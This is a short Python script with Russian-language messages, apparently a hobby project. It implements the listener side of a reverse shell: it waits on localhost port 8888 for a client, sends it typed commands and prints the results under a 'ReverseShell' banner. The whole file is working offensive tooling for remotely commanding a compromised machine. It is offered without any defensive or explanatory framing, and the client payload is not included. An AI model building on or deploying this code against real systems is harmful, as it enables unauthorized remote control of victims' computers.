import socket
import os

from pyfiglet import Figlet
from pystyle import *

import time


Success = Colors.green + "[+]" + Colors.reset
Error = Colors.red + "[-]" + Colors.reset
Info = Colors.blue + "[*]" + Colors.reset


def reverse_shell():
    try:
        print(f"\n{Info} Ожидание подключения клиента к серверу!")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('127.0.0.1', 8888))
        s.listen(5)

        client, addr = s.accept()
        print(f"\n{Success} Подключение к серверу от {addr[0]}")

        time.sleep(2)

        display_banner()

        while True:
            command = input("\nВведите команду ('exit' - Для выхода): ")
            client.send(command.encode())
            if command.lower() == 'exit':
                print("")
                break
            result_output = client.recv(4096).decode()
            print(f"{Success} Результат: \n{result_output}")


        client.close()
        s.close()
    except Exception as e:
        print(f"{Error} Произошла ошибка при подключении: {e}")


def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    t = Figlet(font='slant')
    Print = t.renderText('ReverseShell')
    Write.Print(Center.XCenter(Print), Colors.blue_to_cyan, interval=0.001)


def main():
    display_banner()
    reverse_shell()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nДо свидания!")